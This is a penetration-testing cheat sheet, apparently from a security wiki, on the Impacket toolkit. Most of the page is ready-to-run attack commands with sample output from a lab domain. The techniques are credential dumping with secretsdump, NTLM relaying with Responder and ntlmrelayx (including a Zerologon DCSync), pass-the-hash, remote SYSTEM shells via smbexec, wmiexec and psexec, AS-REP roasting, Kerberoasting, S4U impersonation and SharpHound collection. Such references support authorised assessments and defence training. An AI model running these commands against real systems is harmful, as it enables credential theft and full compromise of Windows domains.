---
title : "Impacket"
# pre : ' '
description : "Is a collection of Python classes for working with network protocols."
date : 2020-03-16T12:37:21+01:00
# hidden : true
# draft : true
weight : 0
# tags : ['']
---

## Impacket

Is a collection of Python classes for working with network protocols.

### Installation

```plain
git clone https://github.com/SecureAuthCorp/impacket.git
```

```plain
sudo pip3 install .
```

### Tool list

```plain
addcomputer.py     getTGT.py         netview.py            reg.py          sniff.py
atexec.py          GetUserSPNs.py    nmapAnswerMachine.py  rpcdump.py      split.py
dcomexec.py        goldenPac.py      ntfs-read.py          sambaPipe.py    ticketConverter.py
dpapi.py           ifmap.py          ntlmrelayx.py         samrdump.py     ticketer.py
esentutl.py        karmaSMB.py       opdump.py             secretsdump.py  wmiexec.py
findDelegation.py  kintercept.py     ping6.py              services.py     wmipersist.py
GetADUsers.py      lookupsid.py      ping.py               smbclient.py    wmiquery.py
getArch.py         mimikatz.py       psexec.py             smbexec.py
GetNPUsers.py      mqtt_check.py     raiseChild.py         smbrelayx.py
getPac.py          mssqlclient.py    rdp_check.py          smbserver.py
getST.py           mssqlinstance.py  registry-read.py      sniffer.py
```

### SAMrdump - This script downloads the list of users for the target system

```plain
samrdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip>

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.10.16
Found domain(s):
 . OFFSEC
 . Builtin
[*] Looking up users in domain OFFSEC
Found user: Administrator, uid = 500
Found user: Guest, uid = 501
Found user: krbtgt, uid = 502
Found user: johndo, uid = 1107
Found user: adm_johndo, uid = 1108
Found user: janedo, uid = 1110
Found user: tokio, uid = 1111
Found user: lisboa, uid = 1112
Found user: professor, uid = 1113
Found user: nairobi, uid = 1114
Found user: helsinki, uid = 1115
Administrator (500)/FullName:
Administrator (500)/UserComment:
Administrator (500)/PrimaryGroupId: 513
Administrator (500)/BadPasswordCount: 0
Administrator (500)/LogonCount: 24
Administrator (500)/PasswordLastSet: 2020-03-18 10:55:43.427441
Administrator (500)/PasswordDoesNotExpire: False
Administrator (500)/AccountIsDisabled: False
Administrator (500)/ScriptPath
[...SNIP...]
```

### Secretsdump - Performs various techniques to dump secrets

{{%attachments title="Related files" fa_icon_class="far fa-file-video" pattern="secretsdump.mp4"/%}}

#### Dump NTDS

Local Administrator privileges required, can be used against every system you're local administrator at.

```plain
$ secretsdump.py JohnDo_LA:'Welkom123'@10.10.10.10                                                                                                     
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x20eb60c12345678909b2e656af
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
serverlocaladmins:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[...SNIP...]
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3e54c484e6abd41234263bc70b11d540f1d0
dpapi_userkey:0x10ab5aed123456789c3870d64008f56836183e
[*] NL$KM 
NL$KM:a9288fd4f741d6d4af0c45b0831234567890b13c68f556c62f4e2cec28c4c14d222e546e0cc5664be6fa135ba90e6293512106ae2
[*] _SC_88MMB_VRT_DHF_HOMX 
SA_LOCAL_SERVICE@INFOSEC.NL.local:ThisIsAStrongPassword?
[*] _SC_88MMB_VRT_DHF_HOUL 
SA_LOCAL_SERVICE@INFOSEC.NL.local:ThisIsAStrongPassword?
[*] _SC_88MMB_VRT_LHF_HOML 
SA_LOCAL_SERVICE@INFOSEC.NL.local:ThisIsAStrongPassword?
[*] _SC_88MMB_VRT_LHF_HOUI 
SA_LOCAL_SERVICE@INFOSEC.NL.local:ThisIsAStrongPassword?
[*] Cleaning up... 
```

#### Dump specific user

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-user [USERNAME]
```

```plain
secretsdump.py offsec.nl/administrator:Welkom1234@10.10.10.16 -just-dc-user johndo

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
offsec.nl\johndo:1107:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
[*] Kerberos keys grabbed
offsec.nl\johndo:aes256-cts-hmac-sha1-96:06ee0aa90ea7dde71f087863ccd5adf227bb54beaa7b081e6512a60ada48473e
offsec.nl\johndo:aes128-cts-hmac-sha1-96:81596d7f55dd4f1a2e75acc62816df70
offsec.nl\johndo:des-cbc-md5:85b5a7a404fe6ed0
[*] Cleaning up...
```

#### Dump all hashes (hashcat ready)

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-ntlm
```

#### Dump all hashes including history

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-ntlm -history
```

#### Dump all hashes including history and user status

```plain
secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-ntlm -history -user-status
```

Filter enabled accounts hashcat ready

```plain
grep -E 'status=Enabled' secretsdump-users-with-status.txt | awk '{print $1}'
```

#### Example dump all hashes NTLM format

```plain
secretsdump.py offsec.nl/administrator:Welkom1234@10.10.10.16 -just-dc-ntlm

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:102277341d6c113a28017200e1dfafe9:::
offsec.nl\johndo:1107:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
offsec.nl\adm_johndo:1108:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
offsec.nl\janedo:1110:aad3b435b51404eeaad3b435b51404ee:f3fe13546c4c0d2db443a0865626203b:::
[...SNIP...]
[*] Cleaning up...
```

#### Dump with hash instead of plaintext password

```plain
$ secretsdump.py offsec.nl/sa.sql@10.10.10.10 -hashes ':55e2eb2ba1c8710ba2530929e3fe5e2f' -just-dc-ntlm
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ca919b8610623b7283bc9d0fb4c03713:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:53dca7b06adf7704769edcf8b59985a5:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
offsec.nl\sa.das-forefront:1114:aad3b435b51404eeaad3b435b51404ee:167ee7a267199ffa715cf8fd86738c93:::
offsec.nl\user1:1118:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
offsec.nl\user2:1119:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
offsec.nl\user3:1120:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

#### Dump specific user only

```plain
$ secretsdump.py offsec.nl/johndo-adm@10.10.10.10 -just-dc-ntlm -just-dc-user john.do
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
offsec.nl\john.do:8124:aad3b435b51404eeaad3b435b51404ee:61ce05b7b3951672d5d42c4c16ccce6b:::
[*] Cleaning up... 
```

### Extract SAM accounts from SAM/SYSTEM hive

Instead of using [samdump2]({{< ref "samdump2" >}}).

Required files:

* SAM (`C:\Windows\System32\config\SAM`)
* SYSTEM (`C:\Windows\System32\config\SYSTEM`)

```plain
$ secretsdump.py -sam SAM -system SYSTEM LOCAL          
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xabb459ddd821f4e0305b373605bce20e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8155d421e8780df8e232009a74bef7b7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6b0249e23821f46803d6ba5ace77490a:::
TESTING:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John Do:1002:aad3b435b51404eeaad3b435b51404ee:88056d8301a3b9165f6b9efc671caa41:::
Henk:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

### Extract accounts from NTDS.dit

Also check [NTDS.ditExtract]({{< ref "ntds-dump" >}}).

Required files:

* NTDS.dit (`C:\Windows\NTDS\ntds.dit`)
* SYSTEM (`C:\Windows\System32\config\SYSTEM`)

```plain
$ secretsdump.py -system SYSTEM -ntds NTDS.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract -just-dc-ntlm -user-status -history
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xa78f11b1234567893f2b6ea8613764
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 640afd6c9912345678977329f09
[*] Reading and decrypting hashes from ntds.dit
john_do:19530:aad3b435b51404eeaad3b435b51404ee:6ed6a61234567898f78076f844::: (status=Enabled)
john_do_adm:19530:aad3b435b51404eeaad3b435b51404ee:2b311d396123456789f280077beee::: (status=Disabled)
```

### NTLMrelayx.py

For every connection received, this module will try to relay that connection
to specified target(s) system or (by default) the original client

Start Responder.py and turn off HTTP and SMB server.

```plain
$ sudo python3 Responder.py -I enp0s31f6
[...SNIP...]
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
   WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
[...SNIP...]
```

Start ntlmrelayx.py with the target system in place.

```plain
$ sudo ntlmrelayx.py -t DCSYNC://10.10.10.10 -smb2support
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
[...SNIP...]
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Connection from offsec/ADMINISTRATOR@10.10.10.11 controlled, attacking target dcsync://10.10.10.10
[*] Connecting to 10.10.10.10 NETLOGON service
[*] Netlogon Auth OK, successfully bypassed autentication using Zerologon after 1 attempts!
[*] offsec\Administrator successfully validated through NETLOGON
[*] NTLM Sign/seal key: cf65d6660ec15d940f687bde79572094[...SNIP...]
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
[...SNIP...]
```

By default NTLMrelayx.py relays to the client who sends the hash, dumping SAM.

```plain
$ sudo ntlmrelayx.py -smb2support
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
[...SNIP...]
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Connection from offsec/ADMINISTRATOR@10.10.10.11 controlled, attacking target smb://10.10.10.10
[*] Connecting to 10.10.10.10 NETLOGON service
[*] SMB Auth OK, successfully
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
```

To use NTLMrelayx.py with a list of targets you want to relay to, first generate a list with [CrackMapExec]({{< ref "crackmapexec" >}}) by using the command below.

```plain
crackmapexec smb 192.168.10.0/24 --gen-relay-list targetlist
```

Then you can use the `-tf` flag with NTLMrelayx.py to use the targetlist created as input file.

### SMBClient - SMB client implementation

{{%attachments title="Related files" fa_icon_class="far fa-file-video" pattern="smbclient.mp4"/%}}

```plain
smbclient.py offsec.nl/administrator:Welkom1234@10.10.10.10

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
# use C$
# ls
drw-rw-rw-          0  Tue Mar 17 16:11:19 2020 $Recycle.Bin
-rw-rw-rw-     389332  Tue Mar 17 01:27:24 2020 bootmgr
-rw-rw-rw-          1  Tue Mar 17 01:27:24 2020 BOOTNXT
drw-rw-rw-          0  Mon Mar 16 16:32:03 2020 Documents and Settings
-rw-rw-rw- 1073741824  Wed Mar 18 08:56:25 2020 pagefile.sys
drw-rw-rw-          0  Mon Mar 16 17:53:03 2020 PerfLogs
drw-rw-rw-          0  Tue Mar 17 01:30:24 2020 Program Files
drw-rw-rw-          0  Tue Mar 17 01:30:24 2020 Program Files (x86)
drw-rw-rw-          0  Tue Mar 17 16:14:16 2020 ProgramData
drw-rw-rw-          0  Mon Mar 16 16:32:05 2020 Recovery
drw-rw-rw-          0  Mon Mar 16 18:09:38 2020 System Volume Information
drw-rw-rw-          0  Tue Mar 17 16:10:54 2020 Users
drw-rw-rw-          0  Tue Mar 17 16:12:50 2020 Windows
-rw-rw-rw-          8  Wed Mar 18 13:10:48 2020 __output
```

### SMBexec - Start SYSTEM shell

{{%attachments title="Related files" fa_icon_class="far fa-file-video" pattern="smbexec.mp4"/%}}

#### Start RCE via SMB

```plain
smbexec.py <domain>/<domain-or-local-admin-or-user>:<password>@<domain-controller-ip>
```

```plain
smbexec.py offsec.nl/administrator:Welkom1234@10.10.10.16

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

### WMIexec - Executes a semi-interactive shell using Windows Management Instrumentation

Enters as the user, not SYSTEM

```plain
$ wmiexec.py offsec.nl/administrator:Welkom1234@10.10.10.16

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
offsec\administrator
```

Enter with hash instead of password

```plain
$ wmiexec.py administrator@10.10.10.16 -hashes :0e0363213e37b94221497260b0bcb4fc Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

Use [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe) in WMIexec.

```plain
$ wmiexec.py admin:Welkom1234@10.10.10.10
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
put[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>put SharpHound.exe
[*] Uploading SharpHound.exe to C:\SharpHound.exe
C:\>SharpHound.exe --CollectionMethod All -d offsec.local --ldapusername johndo --ldappassword Welkom1234 --domaincontroller 10.10.10.10
------------------------------------------------
Initializing SharpHound at 10:59 AM on 11/5/2020
------------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain offsec.LOCAL using path CN=Schema,CN=Configuration,DC=offsec,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 18 MB RAM
Status: 74 objects finished (+74 74)/s -- Using 26 MB RAM
Enumeration finished in 00:00:01.6392385
Compressing data to .\20201105105903_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 10:59 AM on 11/5/2020! Happy Graphing!


C:\>get 20201105105903_BloodHound.zip
[*] Downloading C:\\20201105105903_BloodHound.zip
```

### SMBrelayx - Relay hashes across the network

Requires SMB-signing disabled or not required.

[Byt3bl33d3r.github.io - Practical guide to NTLM relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

### GetNPUsers.py - ASREPRoasting

```plain
$ GetNPUsers.py offsec.nl/ -usersfile users -dc-ip 10.10.20.134
Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

[-] User johndo doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@offsec.nl:0507c99ed0c44924dee1bd4fdb34e0b9$e6abe0cd017c45688ff4d667183ce9c8cb171635250c7a5d1f12666549466ecb367e6445751b867a44f483e8b255ebd039ea7375229a1c6763eb61965d34945b8500058e36dd32fadd6bdc5dc5fff5ef6ebc90343bdf177984852b3536fb12ab4a21f8cdee93339e7fc97d3028eb1f7643e1c9156f7d1facd658dd5b2061572f615abc4ea4007294ee648f38af428ef5f7045bb194c44bfef4f39f14ad02e982f74ef49a5a904e874ce1c2b5a38b61a4b30b58b2b521f4f81cdaee348b497a9ca757fe33e30e9ef6c7911963e120e905f5cf063964b5a13f7d9668a1f3e63466d1c0d18d9e76e31a8bec236fff42fa928dac
[-] User johndo-adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User janedo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### GetUserSPNs.py - Kerberoasting

```plain
$ GetUserSPNs.py -target-domain offsec.nl -request -outputfile out.log -dc-ip 10.10.10.10 offsec.nl/normal-user
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName               Name               MemberOf                                                              PasswordLastSet             LastLogon                   Delegation
---------------------------------  -----------------  --------------------------------------------------------------------  --------------------------  --------------------------  ----------
SRV2016-DC/DC01.offsec.nl         DC01 [REDACTED]

$ cat out.log
$krb5tgs$23$*[REDACTED]
```

### findDelegation.py - Queries target domain for delegation relationships

```plain
$ findDelegation.py offsec.nl/normal-user:'Welkom1234'
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

AccountName     AccountType     DelegationType                  DelegationRightsTo
-----------     -----------     --------------------------      ------------------
janedo          Person          Resource-Based Constrained      SRV01$
```

### getST.py - Given a password, hash or aesKey, it will request a Service Ticket and save it as ccache

[Using tickets](https://swarm.ptsecurity.com/kerberoasting-without-spns/).

To use tickets install the `klist` tool with `sudo apt install krb5-user`

```plain
$ getST.py -impersonate Administrator -spn 'host/SRV01.offsec.NL' offsec.NL/janedo:'Welkom1234'
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

### SMBServer.py - Create a SMB server where a user can connect to

#### SMB server share without password

```plain
sudo smbserver.py -ip <ip-to-bind> <share-name> <local-folder-to-share>
```

#### SMB server share with password

```plain
sudo smbserver.py -username <username> -password <password> -ip <ip-to-bind> <share-name> <local-folder-to-share>
```

#### SMB server during assessment to catch hashes

```plain
sudo smbserver.py -smb2support share $PWD
```

### RDP_check.py - Check if RDP access is granted

```plain
$ rdp_check.py offsec/johndo:Welkom1234@10.10.10.10
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Access Granted
```

### psexec.py

```plain
$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83 Administrator@10.10.10.16
Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.16.....
[*] Found writable share ADMIN$
[*] Uploading file KbEylSCh.exe
[*] Opening SVCManager on 10.10.10.16.....
[*] Creating service CdaA on 10.10.10.16.....
[*] Starting service CdaA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### Error help

#### PyAsn1UnicodeDecodeError

```plain
ImportError: cannot import name 'PyAsn1UnicodeDecodeError'
```

```plain
sudo pip3 install -U pyasn1
```

### URL list

* [GitHub.com - Impacket](https://github.com/SecureAuthCorp/impacket/)
* [Hackingarticles.in - Beginners guide to impacket toolkit](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
* [Byt3bl33d3r.github.io - NTLM relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* [Medium.com - Extracting NTDS.dit](https://medium.com/@bondo.mike/extracting-and-cracking-ntds-dit-2b266214f277)
* [Swarm.ptsecurity.com - Kerberoasting without SPN's](https://swarm.ptsecurity.com/kerberoasting-without-spns/)
